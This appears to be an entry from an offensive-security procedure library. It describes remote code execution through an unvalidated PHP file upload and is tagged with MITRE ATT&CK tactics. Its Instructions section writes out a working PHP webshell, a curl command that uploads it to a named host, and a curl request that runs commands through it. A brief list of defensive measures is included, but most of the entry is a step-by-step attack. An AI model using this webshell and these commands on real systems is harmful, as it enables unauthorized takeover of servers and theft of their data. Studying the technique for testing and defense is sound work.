---
id: proc-php-upload-rce-001
tags:
  - rce
  - php
  - file-upload
  - code-injection
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/curl-php-upload]]'
verified: false
platforms:
  - Web
  - PHP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
updated_at: '2025-12-14T17:23:27.303Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
---
# Upload-Malicious-PHP-File-for-RCE

## Summary

This procedure exploits a web application's file upload functionality that lacks proper validation, allowing the upload of PHP files containing malicious code. Once uploaded, the file is executed by the server, enabling remote code execution (RCE) and potential full compromise of the server.

## Description

In vulnerable PHP-based web applications, file upload endpoints often fail to restrict file extensions or content types, permitting users to upload .php files with embedded PHP code. When the server processes or serves these files from an executable directory, the PHP interpreter evaluates the code, leading to arbitrary command execution. This attack targets public-facing upload features, such as those in content management systems or custom apps, and requires only network access to the endpoint. Expected outcomes include running system commands, reading sensitive files, or establishing persistence.

## Requirements

1. Access to a vulnerable file upload endpoint (e.g., POST to /upload.php)
2. Network connectivity to the target web server
3. Basic tools like curl for HTTP requests; no special privileges needed if upload is unauthenticated

## Defense

Defensive measures and detection strategies:

- Implement strict file type validation (e.g., whitelist extensions like .jpg, .pdf) and content scanning for executable code
- Store uploads outside the web root or in non-executable directories
- Use WAF rules to block uploads with .php extensions or suspicious MIME types
- Monitor server logs for anomalous file uploads and executions

## Objectives

1. Upload a malicious PHP file to the server
2. Trigger execution of the uploaded code
3. Execute arbitrary commands to confirm RCE

## Instructions

### Step 1: Prepare Malicious PHP File

**Context**: Create a simple PHP webshell that executes system commands via GET parameters.

**Command** ([[commands/create-php-shell]]):
```bash
echo '<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>' > shell.php
```

> This generates a basic PHP file named shell.php. The command uses echo to write the PHP code, which checks for a 'cmd' parameter and runs it via system(). Expected output: A file shell.php is created locally.

### Step 2: Upload the File

**Context**: Use HTTP POST to upload the file to the vulnerable endpoint, mimicking a standard file upload request.

**Command** ([[commands/curl-php-upload]]):
```bash
curl -X POST -F "file=@shell.php" http://axa.dxi.eu/upload-endpoint
```

> Replace the URL with the actual upload endpoint (e.g., /upload.php). The -F flag sends the file as multipart/form-data. Expected output: HTTP 200 OK or success message indicating upload completion; check response for file path.

### Step 3: Trigger Execution

**Context**: Access the uploaded file directly to execute the PHP code and run a test command.

**Command** ([[commands/curl-execute-php]]):
```bash
curl "http://axa.dxi.eu/uploads/shell.php?cmd=id"
```

> Assuming the file is stored in /uploads/, this executes the 'id' command. Expected output: Server response showing user/group IDs, confirming RCE (e.g., "uid=33(www-data) gid=33(www-data)").

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Command-Line Interface]]

### Sub-Techniques


## Commands Used

- [[commands/create-php-shell]]
- [[commands/curl-php-upload]]
- [[commands/curl-execute-php]]

## Tools Used

- [[tools/curl]]

## Tags

- rce
- php
- file-upload
